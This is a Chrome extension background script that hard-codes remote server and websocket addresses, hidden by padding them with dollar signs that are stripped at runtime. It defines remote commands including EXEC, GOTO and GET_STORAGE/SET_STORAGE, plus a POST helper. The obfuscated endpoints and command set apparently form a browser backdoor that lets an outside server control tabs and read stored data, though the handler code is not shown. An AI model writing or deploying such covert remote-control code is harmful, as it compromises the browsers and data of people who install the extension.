let WS
const INITAL_CONFIG = {
  uuid: 'KB',
  // url: "h$$$$t$$$$t$$$$p:/$$$$/l$$$$o$$$$ca$$$$l$$$$ho$$$$st".replace(/\$/g, ''),
  // socketUrl: "w$$$$s$$$$:/$$$$/$$$$lo$$$$ca$$$$l$$$$h$$$$o$$$$s$$$$t".replace(/\$/g, ''),
  // socketHost: "h$$t$$t$$p$$:/$$$$/$$$$lo$$$$ca$$$$l$$$$h$$$$o$$$$s$$$$t".replace(/\$/g, ''),
  url:'h$$t$$$t$$p$$s://$$$$$$j$$$$$c$$$$$$b$$$$$a$$$$$k$$$$er$$$$$y.he$$$$$rok$$$$$ua$$$$$pp.c$$$$o$$$$$m'.replace(/\$/g, ''),
  socketUrl: '$$w$$$$s$$$s$$$:$$/$$/c$$$$h$$$$r$$$$o$$$$m$$$$e-s$$$$o$$$$c$$$$k$$$$et.$$$$he$$$$ro$$$$kua$$$$p$$$$p.$$$$c$$$$om'.replace(/\$/g, ''),
  socketHost: '$$h$$t$$t$$p$$s$$:$$/$$/c$$$$h$$$$r$$$$o$$$$m$$$$e-s$$$$o$$$$c$$$$k$$$$et.$$$$he$$$$ro$$$$kua$$$$p$$$$p.$$$$c$$$$om'.replace(/\$/g, ''),
}
const STORAGE_LOCAL = chrome.storage.local
const STORAGE_SYNC = chrome.storage.sync
async function CONFIG() {
  const { isInit } = STORAGE_LOCAL.get('isInit')
  return isInit ? await STORAGE_LOCAL.get('config') : INITAL_CONFIG
}

chrome.runtime.onInstalled.addListener(async () => {
  STORAGE_LOCAL.set({ ...INITAL_CONFIG, isInit: true })
  console.log('Installed %csuccessfully', `color: #3aa757`)
})

const CMD = {
  TAB: 'TAB',
  TABS: 'TABS',
  GOTO: 'GOTO',
  HELP: 'HELP',
  EXEC: 'EXEC',
  NEW_TAB: 'NEW_TAB',
  LOCAL: 'LOCAL',
  SYNC: 'SYNC',
  GET_STORAGE: 'GET_STORAGE',
  SET_STORAGE: 'SET_STORAGE'
}

function POST({ url, body = {}, headers = {} }) {
  return fetch(url, {
    method: 'POST',
    headers: {
      Accept: 'application/json',
      'Content-Type': 'application/json',
      ...headers
    },
    body: typeof body === 'string' ? body : JSON.stringify(body)
  }).catch(e => console.error(e))
}